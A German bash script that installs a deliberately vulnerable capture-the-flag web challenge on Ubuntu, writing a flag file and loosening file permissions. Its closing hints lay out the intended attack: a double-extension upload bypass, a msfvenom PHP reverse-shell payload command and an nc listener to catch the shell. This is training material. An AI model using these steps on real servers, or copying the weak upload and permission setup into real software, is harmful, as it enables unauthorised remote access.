#!/bin/bash

#############################################################################
# Installation Script für #LuzernerMoments CTF Website (Flag 1)
# Für Ubuntu Server 24.04.3 LTS
#############################################################################

set -e  # Beende bei Fehler

echo "================================================"
echo "  #LuzernerMoments CTF Website Installation"
echo "  Flag 1: Initial Access - Webseite"
echo "================================================"
echo ""

# Prüfe ob Script als root ausgeführt wird
if [ "$EUID" -ne 0 ]; then 
    echo "[ERROR] Bitte führe dieses Script als root aus (sudo)"
    exit 1
fi

echo "[1/9] Aktualisiere Paketlisten..."
apt update -qq

echo "[2/9] Installiere Git (falls nicht vorhanden)..."
if ! command -v git &> /dev/null; then
    apt install -y git
else
    echo "       Git ist bereits installiert"
fi

echo "[3/9] Klone Repository von GitHub..."
TEMP_DIR="/tmp/cyberwars_install_$$"
rm -rf "$TEMP_DIR"
git clone https://github.com/Flurin17/cyberwars.git "$TEMP_DIR"

echo "[4/9] Installiere Apache2 und PHP..."
apt install -y apache2 php libapache2-mod-php php-cli

echo "[5/9] Kopiere Website-Dateien nach /var/www/html..."
# Sichere existierende index.html wenn vorhanden
if [ -f /var/www/html/index.html ]; then
    mv /var/www/html/index.html /var/www/html/index.html.backup
fi

# Kopiere alle Website-Dateien
cp "$TEMP_DIR/index.php" /var/www/html/
cp "$TEMP_DIR/upload.php" /var/www/html/
cp "$TEMP_DIR/gallery.php" /var/www/html/
cp "$TEMP_DIR/thanks.php" /var/www/html/
cp "$TEMP_DIR/config.php" /var/www/html/
cp "$TEMP_DIR/functions.php" /var/www/html/
cp "$TEMP_DIR/robots.txt" /var/www/html/
cp "$TEMP_DIR/.htaccess" /var/www/html/

# Kopiere assets Verzeichnis
mkdir -p /var/www/html/assets
cp "$TEMP_DIR/assets/style.css" /var/www/html/assets/

# Kopiere Decoy-Verzeichnisse für Web-Enumeration
mkdir -p /var/www/html/old
mkdir -p /var/www/html/config
cp "$TEMP_DIR/old/index.php" /var/www/html/old/
cp "$TEMP_DIR/config/index.php" /var/www/html/config/

echo "[6/9] Erstelle Verzeichnisstruktur..."
# Erstelle uploads/ Verzeichnis
mkdir -p /var/www/html/uploads
cp "$TEMP_DIR/uploads/index.php" /var/www/html/uploads/

# Erstelle data/ Verzeichnis
mkdir -p /var/www/html/data

# Erstelle uploaded_files.txt
touch /var/www/html/data/uploaded_files.txt

# Setze Berechtigungen
chown -R www-data:www-data /var/www/html
chmod 755 /var/www/html
chmod 755 /var/www/html/uploads
chmod 755 /var/www/html/data
chmod 755 /var/www/html/assets
chmod 755 /var/www/html/old
chmod 755 /var/www/html/config
chmod 644 /var/www/html/*.php
chmod 644 /var/www/html/.htaccess
chmod 644 /var/www/html/robots.txt
chmod 644 /var/www/html/assets/style.css
chmod 644 /var/www/html/old/index.php
chmod 644 /var/www/html/config/index.php
chmod 666 /var/www/html/data/uploaded_files.txt

echo "       Dateien für www-data konfiguriert:"
echo "       - Upload-Verzeichnis: /var/www/html/uploads/ (755)"
echo "       - Daten-Datei: /var/www/html/data/uploaded_files.txt (666)"
echo "       - Decoy-Verzeichnisse: /old/, /config/ (für Enumeration)"

echo "[7/9] Erstelle System-User 'webflag'..."
# Prüfe ob User bereits existiert
if id "webflag" &>/dev/null; then
    echo "       User 'webflag' existiert bereits"
else
    useradd -r -m -s /usr/sbin/nologin webflag
    echo "       User 'webflag' wurde erstellt"
fi

echo "[8/9] Erstelle Flag-Datei..."
# Erstelle Flag in /home/webflag/flag.txt
echo "flag{initial_access_luzernermoments_83723}" > /home/webflag/flag.txt
chown webflag:webflag /home/webflag/flag.txt
chmod 444 /home/webflag/flag.txt
# WICHTIG: www-data muss das Verzeichnis betreten können!
chmod 755 /home/webflag
echo "       Flag wurde in /home/webflag/flag.txt gespeichert"
echo "       Berechtigungen: webflag home=755, flag.txt=444"

echo "[9/9] Aktiviere und starte Apache..."
# Aktiviere Apache rewrite Modul
a2enmod rewrite

# Erlaube .htaccess Overrides
sed -i '/<Directory \/var\/www\/>/,/<\/Directory>/ s/AllowOverride None/AllowOverride All/' /etc/apache2/apache2.conf

# Starte Apache neu
systemctl enable apache2
systemctl restart apache2

# Räume auf
echo ""
echo "[CLEANUP] Entferne temporäre Dateien..."
rm -rf "$TEMP_DIR"

echo ""
echo "================================================"
echo "  ✓ Installation erfolgreich abgeschlossen!"
echo "================================================"
echo ""
echo "Die Website ist jetzt erreichbar unter:"
echo "  → http://$(hostname -I | awk '{print $1}')"
echo "  → http://10.0.2.10 (wenn statische IP konfiguriert)"
echo ""
echo "Flag 1 befindet sich in: /home/webflag/flag.txt"
echo ""
echo "Datenstrukturen (www-data Zugriff):"
echo "  - Hochgeladene Dateien: /var/www/html/uploads/"
echo "  - Upload-Log: /var/www/html/data/uploaded_files.txt"
echo ""
echo "Enumeration Targets:"
echo "  - robots.txt enthält Hinweise auf versteckte Pfade"
echo "  - gallery.php ist NICHT in der Navigation (muss gefunden werden)"
echo "  - Decoy-Verzeichnisse: /old/, /config/"
echo ""
echo "Hinweise für CTF-Teilnehmer:"
echo "  1. Web-Enumeration: feroxbuster/gobuster mit Kali Wordlists"
echo "  2. robots.txt analysieren"
echo "  3. Versteckte gallery.php finden"
echo "  4. Upload-Funktionalität testen"
echo "  5. Double-Extension Bypass: shell.php.jpg"
echo "  6. msfvenom: msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php"
echo "  7. Upload shell.php.jpg (Browser oder curl)"
echo "  8. Filename ist NICHT randomisiert → /uploads/shell.php.jpg"
echo "  9. nc -lvnp 4444 && curl http://target/uploads/shell.php.jpg"
echo " 10. Flag in /home/webflag/flag.txt"
echo ""
echo "================================================"

